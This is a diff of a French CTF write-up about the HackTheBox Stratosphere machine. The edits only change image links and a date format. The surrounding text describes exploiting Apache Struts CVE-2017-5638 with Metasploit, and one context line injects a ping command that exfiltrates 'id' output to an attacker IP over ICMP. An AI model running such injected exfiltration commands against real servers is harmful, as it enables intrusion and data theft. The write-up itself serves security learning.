@@ -29,13 +29,13 @@ On remarque tout de même un pattern dans le format des URLs (première lettre e
 
 Parmi les résultats obtenus le plus intéressant est le script *Login\_db.action* qui retourne une stack trace faisait référence à *Struts* (un framework J2E).  
 
-![HTB Stratosphere Struts stack trace](https://github.com/devl00p/blog/raw/master/images/htb/stratos_stacktrace.png)
+![HTB Stratosphere Struts stack trace](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/stratos_stacktrace.png)
 
 Une recherche dans *Metasploit* retourne une poignée d'exploits en en regardant les infos détaillées de chaque module on voit parfois une mention à un script *HelloWorld.action*.  
 
 Est-ce un placeholder ou une véritable réféence à un script présent par défaut ? Toujours est-il qu'il y a bien un *HelloWorld.action* sur la machine du challenge :)  
 
-![HTB Stratosphere Equihax Struts](https://github.com/devl00p/blog/raw/master/images/htb/stratos_struts.png)
+![HTB Stratosphere Equihax Struts](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/stratos_struts.png)
 
 On devine un clin d’œil au hack de la société *Equifax*. Cette dernière a été victime d'une intrusion médiatisée via l'exploitation de la faille dans Struts [CVE-2017-5638](https://www.cvedetails.com/cve/CVE-2017-5638/).  
 
@@ -88,7 +88,7 @@ msf exploit(multi/http/struts2_content_type_ognl) > set CMD "ping -p `id | xxd -
 CMD => ping -p `id | xxd -p -l 16` 10.10.14.209
 ```
 
-![HTB Stratosphere ICMP exfiltration with ping](https://github.com/devl00p/blog/raw/master/images/htb/stratos_ping_exfil.png)
+![HTB Stratosphere ICMP exfiltration with ping](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/stratos_ping_exfil.png)
 
 Ça ne résous pas réellement notre problème à savoir le besoin d'obtenir un shell interactif (même sans pty, on ne fera pas les difficiles) ou une façon de déposer des fichiers sur la machine :(   
 
@@ -283,4 +283,4 @@ That's about it
 
 Ce fut un CTF intéressant de part ses règles de pare feu et son énumération locale qui a été assez laborieuse :p
 
-*Published September 01 2018 at 18 56*
+*Published September 01 2018 at 18:56*
